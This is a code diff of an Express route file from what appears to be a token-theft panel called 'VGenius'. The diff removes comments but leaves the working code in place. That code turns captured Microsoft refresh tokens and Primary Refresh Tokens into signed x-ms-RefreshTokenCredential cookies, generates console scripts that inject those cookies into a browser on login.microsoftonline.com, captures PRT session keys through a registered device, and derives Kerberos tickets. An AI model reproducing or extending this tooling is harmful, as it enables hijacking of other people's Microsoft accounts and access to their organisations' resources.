@@ -21,11 +21,6 @@ const tokenUpload = multer({
   }
 });
 
-// Safe decrypt: returns null instead of throwing on bad/empty ciphertext.
-// Module-level so every route can share it. Decrypt failures are expected
-// here (placeholder values, wrong key after rotation, truncated rows),
-// so a 500 on a single bad field is wrong — return null and let the
-// caller decide how to respond.
 function safeDecrypt(val) {
   if (!val) return null;
   try {
@@ -67,11 +62,8 @@ async function checkAccountTypeColumn() {
   }
 }
 
-// ─── Skip /inject/* paths - these are handled by cookieinject.js ────
-// This prevents /api/tokens/inject/* from being matched by tokenRoutes
+
 router.get('/inject*', (req, res) => {
-  // This catch-all ensures /api/tokens/inject/* paths return 404 from this router
-  // and can be handled by the mounted cookieInjectRoutes at /api/tokens/inject
   res.status(404).json({ error: 'Not found - use /api/tokens/inject/* for cookie injection' });
 });
 
@@ -222,20 +214,8 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
       try { return decrypt(val); } catch (e) { return null; }
     };
 
-    // ── GraphSpy PRT method ONLY ────────────────────────────────────────
-    // This endpoint produces exactly one cookie: the KDF-signed PRT JWT
-    // that GraphSpy's core.prt.generate_cookie() emits — an HS256 JWT
-    // signed with a key derived from the PRT's session key (kdf_ver 2),
-    // set as `x-ms-RefreshTokenCredential` on login.microsoftonline.com.
-    //
-    // Nothing else is produced. The previous refresh-token cookie exchange
-    // (fpc / x-ms-gateway-slice / stsservicecookie / sso_nonce), the
-    // stored-cookie fallback and the bookmarklet format were removed on
-    // purpose: they are different methods and are not what GraphSpy uses.
     const prtkdf = require('../services/prtkdf');
 
-    // Never mint a KDF cookie from a plain refresh token: resolve a real
-    // PRT, self-healing via request_for_device when a device is registered.
     const prtResolution = await resolveRealPrt(token);
     if (!prtResolution.prt) {
       return res.status(409).json({
@@ -253,8 +233,6 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
       });
     }
 
-    // Fetch a fresh srv_challenge nonce and derive the KDF signing key,
-    // exactly like GraphSpy (prt.generate_cookie -> get_srv_challenge_nonce).
     const prtCookie = await prtkdf.generatePrtCookie({
       prt,
       sessionKey: materials.sessionKey,
@@ -265,8 +243,6 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
     const cookieDomain = prtCookie.domain || prtkdf.prtCookieDomain(prt);
     const cookieValue = prtCookie.value;
 
-    // Persist alongside the other stored PRT cookie (same convention as
-    // refreshPrtCookie) so later flows reuse a known-good cookie.
     try {
       await db.query(
         'UPDATE device_credentials SET prt_cookie_encrypted = ?, last_used = NOW(), updated_at = NOW() WHERE user_id = ? AND tenant_id = ?',
@@ -276,15 +252,8 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
       console.error('[Tokens] Failed to persist KDF PRT cookie:', pErr.message);
     }
 
-    // GraphSpy's own instruction is "set x-ms-RefreshTokenCredential on
-    // login.microsoftonline.com, then reload". The script below does that
-    // verbatim — one cookie, then navigate. The cookie is valid ~5 minutes.
-    // Format requested for the operator: one document.cookie line using
-    // lowercase `secure` / `samesite=none`, then a 3s delayed redirect to
-    // /?auth=2. No IIFE wrapper - the script is pasted straight into the
-    // console, so a bare statement plus a timer is all that is needed.
     const script = [
-      '// VGenius PRT Cookie Injection (GraphSpy method)',
+      '// VGenius PRT Cookie Injection',
       '// Paste into the browser console while on https://' + cookieDomain + '/',
       '// (use a clean/incognito window so no other session interferes)',
       'document.cookie = ' + JSON.stringify(cookieName + '=' + cookieValue + '; domain=.' + cookieDomain + '; path=/; secure; samesite=none') + ';',
@@ -306,7 +275,7 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
       cookie_count: 1,
       tenant: materials.tenant,
       generated_at: new Date().toISOString(),
-      message: 'PRT cookie generated (GraphSpy method). Valid for about 5 minutes.'
+      message: 'PRT cookie generated.'
     });
   } catch (err) {
     console.error('[Tokens] Cookie script error:', err.message);
@@ -314,11 +283,6 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
   }
 });
 
-// ─── Parse cookie string/array into array of cookie objects ─────────
-// Handles three input formats:
-//   1. Array of cookie objects (from formatCookiesForInjection)
-//   2. JSON string of array (from stored cookies_encrypted)
-//   3. Legacy cookie string "name=value; name2=value2"
 function parseCookies(cookieString, options) {
   if (!cookieString) return [];
 
@@ -326,9 +290,6 @@ function parseCookies(cookieString, options) {
   var tenant = options.tenant || 'common';
   var accountType = options.accountType || 'unknown';
 
-  // Normalize domain for document.cookie compatibility.
-  // document.cookie CANNOT set parent-domain cookies (.microsoftonline.com).
-  // Must use .login.microsoftonline.com (the exact host or its subdomains).
   function normalizeDomainForDocCookie(domain) {
     if (!domain) return '.login.microsoftonline.com';
     if (domain === '.microsoftonline.com' || domain === 'microsoftonline.com') {
@@ -507,10 +468,6 @@ router.post('/:id/renew', userAuth, async (req, res) => {
 
         // Use stored client_id if available, otherwise fall back to env
         const tokenClientId = token.client_id || config.AZURE_CLIENT_ID;
-        // Pass user_id (and the real email) so the KDF PRT cookie can be
-        // built from device_credentials.session_key_encrypted - without
-        // user_id the session-key lookup is skipped and renewals silently
-        // lose the x-ms-RefreshTokenCredential cookie.
         const result = await cookieConverter.convertTokensToCookies(
           refreshToken, templateType, tokenTenant, token.email || null, token.account_type || 'unknown', req.user.id
         );
@@ -558,8 +515,6 @@ router.post('/:id/renew', userAuth, async (req, res) => {
 
     // Fallback: For cookie-mode tokens without valid link_id, try direct refresh token exchange
     if (!token.link_id || token.token_type === 'cookie') {
-      // Use the cookie converter as fallback (user_id passed so the KDF PRT
-      // cookie can use the stored session key).
       const cookieConverter = require('../services/cookieconverter');
       const cookieResult = await cookieConverter.convertTokensToCookies(
         refreshToken || accessToken, 'office', token.tenant || 'common', token.email || null, token.account_type || 'unknown', req.user.id
@@ -690,10 +645,6 @@ router.get('/inject-script', userAuth, async (req, res) => {
   }
 });
 
-// ─── PRT-only cookie injection script (GraphSpy's method) ─────────────
-// Produces exactly one cookie — the KDF-signed PRT JWT that GraphSpy's
-// core.prt.generate_cookie() emits — set as x-ms-RefreshTokenCredential
-// on the PRT's host, then reload. No other cookie is produced.
 router.get('/prt-inject', userAuth, async (req, res) => {
   try {
     const { token_id } = req.query;
@@ -710,8 +661,6 @@ router.get('/prt-inject', userAuth, async (req, res) => {
     const token = tokens[0];
     const prtkdf = require('../services/prtkdf');
 
-    // Never mint a KDF cookie from a plain refresh token: resolve a real
-    // PRT, self-healing via request_for_device when a device is registered.
     const prtResolution = await resolveRealPrt(token);
     if (!prtResolution.prt) {
       return res.status(400).json({ error: prtResolution.error || 'No PRT available for this token' });
@@ -771,23 +720,12 @@ router.post('/:id/convert', userAuth, async (req, res) => {
     const token = tokens[0];
     const refreshToken = safeDecrypt(token.refresh_token_encrypted);
 
-    // The token endpoint is called with grant_type: 'refresh_token', so an
-    // access token submitted here is rejected with AADSTS9002313 ("Invalid
-    // request. Request is malformed or invalid."). Always prefer the refresh
-    // token; only fall back to the access token when none exists.
     if (!refreshToken) {
       return res.status(400).json({
         error: 'No refresh token available for conversion. Use the Refresh button to renew this token first.'
       });
     }
 
-    // ── GraphSpy PRT method ONLY ────────────────────────────────────────
-    // The conversion produces exactly one cookie: the KDF-signed PRT JWT that
-    // GraphSpy's core.prt.generate_cookie() emits, set as
-    // x-ms-RefreshTokenCredential on the PRT's host. The previous
-    // refresh-token cookie exchange (fpc / x-ms-gateway-slice /
-    // stsservicecookie / sso_nonce) and the bookmarklet format were removed
-    // on purpose — they are different methods and are not what GraphSpy uses.
     const prtkdf = require('../services/prtkdf');
 
     const prt = safeDecrypt(token.prt) || refreshToken;
@@ -811,8 +749,6 @@ router.post('/:id/convert', userAuth, async (req, res) => {
     const cookieName = prtCookie.name || 'x-ms-RefreshTokenCredential';
     const cookieDomain = prtCookie.domain || prtkdf.prtCookieDomain(prt);
 
-    // Persist alongside the other stored PRT cookie (same convention as
-    // refreshPrtCookie) so later flows reuse a known-good cookie.
     try {
       await db.query(
         'UPDATE device_credentials SET prt_cookie_encrypted = ?, last_used = NOW(), updated_at = NOW() WHERE user_id = ? AND tenant_id = ?',
@@ -822,8 +758,6 @@ router.post('/:id/convert', userAuth, async (req, res) => {
       console.error('[Tokens] Could not store PRT cookie:', pErr.message);
     }
 
-    // Keep the stored-cookie field populated so the legacy inject page still
-    // has something to work with — it now holds the PRT cookie only.
     try {
       await db.query(
         'UPDATE captured_tokens SET cookies_encrypted = ? WHERE id = ? AND user_id = ?',
@@ -834,7 +768,7 @@ router.post('/:id/convert', userAuth, async (req, res) => {
     }
 
     const script = [
-      '// VGenius PRT Cookie Injection (GraphSpy method)',
+      '// VGenius PRT Cookie Injection',
       '// Paste into the browser console while on https://' + cookieDomain + '/',
       'document.cookie = ' + JSON.stringify('x-ms-RefreshTokenCredential=' + prtCookie.value + '; domain=.' + cookieDomain + '; path=/; secure; samesite=none') + ';',
       '',
@@ -847,7 +781,7 @@ router.post('/:id/convert', userAuth, async (req, res) => {
     return res.json({
       success: true,
       method: 'prt',
-      message: 'PRT cookie generated (GraphSpy method). Valid for about 5 minutes.',
+      message: 'PRT cookie generated',
       script,
       prt_cookie: prtCookie.value,
       cookie_name: cookieName,
@@ -873,10 +807,6 @@ router.post('/convert-cookie', userAuth, async (req, res) => {
       return res.status(400).json({ error: 'Access token or refresh token is required' });
     }
 
-    // grant_type is always 'refresh_token' on the Microsoft token endpoint,
-    // so submitting an access token here fails with AADSTS9002313
-    // ("Invalid request. Request is malformed or invalid."). Prefer the
-    // refresh token when the caller supplied both.
     const tokenToUse = refresh_token || access_token;
     const cookieConverter = require('../services/cookieconverter');
     const result = await cookieConverter.convertTokensToCookies(
@@ -1095,14 +1025,6 @@ router.post('/:id/derive-tgt', userAuth, async (req, res) => {
   }
 });
 
-// ─── PRT session key / KDF routes (GraphSpy-compatible, prtkdf.js) ─────────
-// prt-capture : Slice C — capture fresh PRT + session key from the enrolled
-//               DRS device (one token call, windows_api_version 2.2).
-// prt-cookie  : Slice A — KDF-signed x-ms-RefreshTokenCredential cookie.
-// prt-token   : Slice B — PRT -> access token (JWE-encrypted response).
-// The raw session key is NEVER returned — redacted status flags only.
-// Additive: the existing Set-Cookie PRT path is not touched.
-
 async function loadTokenRow(req, res) {
   const [tokens] = await db.query(
     'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
@@ -1131,18 +1053,6 @@ async function resolveSessionKeyForToken(token) {
 }
 
 /**
- * Resolve a REAL PRT for a token row, self-healing when the stored prt
- * column still holds the plain refresh token (capture stores the raw RT
- * there for work/school accounts).
- *
- * GraphSpy only mints KDF cookies from a real PRT (a JWT carrying PRT
- * claims - tid/uid/oid/acrs/session_key/client_info). A plain OAuth refresh
- * token (opaque v1 or "M." v2) must never be used as the refresh_token claim
- * of x-ms-RefreshTokenCredential: Entra rejects such cookies. When no real
- * PRT is stored but a device is registered, re-run GraphSpy's device-signed
- * request_for_device (Slice C) and store the fresh PRT + session_key_jwe -
- * exactly what POST /:id/prt-capture does.
- *
  * @returns {Promise<{prt: string|null, refreshed?: boolean, error?: string, tenant?: string}>}
  */
 async function resolveRealPrt(token) {
@@ -1199,10 +1109,6 @@ router.post('/:id/prt-capture', userAuth, async (req, res) => {
     for (const tenant of candidates) {
       try {
         const result = await deviceManager.capturePrtSessionKey(token.user_id, tenant, refreshToken);
-        // Persist the fresh PRT AND session_key_jwe on the token row
-        // (encrypted, like other token material). The JWE is what makes
-        // session_key / tgt_ad / tgt_cloud / tgt_cloud_sessionkey
-        // resolvable later - without it they stay null forever.
         try {
           if (result.sessionKeyJwe) {
             await db.query(
@@ -1219,8 +1125,6 @@ router.post('/:id/prt-capture', userAuth, async (req, res) => {
           console.error('[Tokens] Failed to persist captured PRT:', pErr.message);
         }
 
-        // Re-derive Kerberos TGTs now that a raw PRT + session key exist.
-        // Fire-and-forget so the response is not delayed.
         if (tenant && tenant !== 'common' && tenant !== 'organizations') {
           kerberosService.deriveTGTForToken(token.id)
             .catch(e => console.error('[Tokens] Kerberos derivation error:', e.message));
